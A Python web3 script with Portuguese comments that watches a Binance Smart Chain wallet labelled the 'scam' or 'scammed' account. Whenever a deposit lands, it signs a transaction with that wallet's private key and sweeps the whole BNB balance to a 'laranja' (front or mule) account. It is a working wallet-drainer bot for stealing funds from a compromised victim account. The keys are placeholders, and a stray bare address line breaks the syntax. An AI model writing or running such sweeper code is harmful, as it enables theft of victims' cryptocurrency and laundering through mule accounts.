import asyncio
from multiprocessing.connection import wait
from web3 import HTTPProvider, Web3
from web3.middleware import geth_poa_middleware
from decimal import Decimal
import json
from time import sleep


rpc_url = 'https://data-seed-prebsc-1-s1.binance.org:8545/'
rpc_url_real = 'https://bsc-dataseed.binance.org/'

#endereco do contrato da moeda alvo
contract_address_Lazy = 'kkkkkkkkkkkkkkkkkkk'

#chaves do bot
private_keyBot = 'aaaaaaaaaaaaaa'
pubkey_contaBot = 'bbbbbbbbbbbbbbbbbbbbbbbb'
address_bot = Web3.toChecksumAddress(pubkey_contaBot)

#chaves da scam
private_key_Scam = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
pubkey_contaScam = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
address_scam = Web3.toChecksumAddress(pubkey_contaScam)
0x308dC6D4671877ff4b4e5230121BBAF1c9ab03FA

#conta laranja
pubkey_oran = 'bbbbbbbbbbbbbbbbbbbbb'
address_oran = Web3.toChecksumAddress(pubkey_oran)
private_key_laranja = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'

#conectando no
while(True):
    try:
        print("[-] Conectando no...")
        w3 = Web3(Web3.HTTPProvider(rpc_url))
        connected = w3.isConnected()
        print("[-] Conexao bem sucedida!")
        break
    except Exception as es:
        print("[-] Erro de conexao: ", es)
        print("[-] Tentando nova conexao ...")



global saldo
saldo = w3.fromWei(w3.eth.get_balance(address_scam),'ether')

print("SCAM bnb balance: ", saldo)
print("laranja bnb balance: ", w3.fromWei(w3.eth.get_balance(address_oran),'ether'))

global nonceScam_toor, status, tx_hash
nonceScam_toor = w3.eth.get_transaction_count(address_scam)

status = 0
tx_hash = ''


async def transacao(saldo, status, nonceScam_toor):

    while (True):
        try:
            value = saldo #w3.fromWei(w3.eth.get_balance(address_scam),'ether')

            #se a ultima transacao foi concluida e o saldo é maior que 0.0001 faz outra transacao para retirar tudo
            if status == 0 and value > 0.000232:

                print("[-] LENDO SALDO DAS CONTAS")
                print("[-] Saldo BNB Scammada: ", saldo)
                #print("[-] Saldo BNB bot: ", w3.fromWei(w3.eth.get_balance(address_bot), 'ether'))
                print("[-] Saldo BNB laranja: ", w3.fromWei(w3.eth.get_balance(address_oran), 'ether'),"\n")
                
                    
                print("[-] Tirando quantia... \n")

                #cabecalho de transacao minima de bnb
                
                #print("value: ", value)
                
                value = w3.fromWei(w3.eth.get_balance(address_scam),'ether')
                gas = float(21000*w3.fromWei(w3.toWei('11','gwei'), 'ether' ))
                value2 = float(value) - gas
                value3 = float(str(value2)[:-1])
                #value = w3.fromWei(w3.eth.get_balance(address_scam) - w3.toWei('10', 'gwei'), 'ether')

                print("value for transaction: ", value2)
                print("calculate value by wei: ", value3)
                print("gaaaas: ", gas, "\n")
                    
                    

                tx_bnb_to_bot = {
                    'nonce': nonceScam_toor,
                    'to': pubkey_oran,     #substitui o endereço do bot para o da conta laranja
                    'value': w3.toWei(value3,'ether'),
                    'gas' : 21000,
                    'gasPrice': w3.toWei('11', 'gwei')
                }

                #print("estimate gas: ", w3.eth.estimate_gas(tx_bnb_to_bot))
                #puxando bnb da scammada

                print("[-] Enviando para terceira...\n")
                signed_tx_bnb = w3.eth.account.signTransaction(tx_bnb_to_bot, private_key_Scam)
                tx_hash = w3.eth.send_raw_transaction(signed_tx_bnb.rawTransaction)
                
                print("[-] Ja assinou a transacao... \n")

                status, nonceScam_toor = await espera_resposta(tx_hash, nonceScam_toor)

                #sleep(0.5)
                #print("Transacao concluida!! ")
                

                #return tx_hash, nonceScam_toor

            saldo = w3.fromWei(w3.eth.get_balance(address_scam),'ether')
        except Exception as e:
            print("[*****] Erro: ", e)
            pass        


async def espera_resposta(tx_hash,nonceScam_toor):
    receipt = w3.eth.get_transaction(tx_hash)
    while receipt == Exception:
        print("[-] Transacao ainda nao computada... Arguardando...")

    try:
        status = w3.eth.wait_for_transaction_receipt(tx_hash)['status']
        #se a transacao foi adicionada no bloco e concluida status == 1
        if receipt != Exception and status == 1:
            print("[-] Transacao realizada com sucesso!\n")
            print("[-] LENDO SALDO DAS CONTAS")
            print("[-] Saldo BNB Scammada: ", w3.fromWei(w3.eth.get_balance(address_scam),'ether'))
            #print("[-] Saldo BNB bot: ", w3.fromWei(w3.eth.get_balance(address_bot), 'ether'))
            print("[-] Saldo BNB laranja: ", w3.fromWei(w3.eth.get_balance(address_oran), 'ether'),"\n")
            nonceScam_toor = receipt['nonce'] + 1
            status = 0
            return status, nonceScam_toor
    except Exception as es:
        print("[+++++++] ERRO na espera da transacao: ", es)
        

asyncio.run(transacao(saldo, status,nonceScam_toor))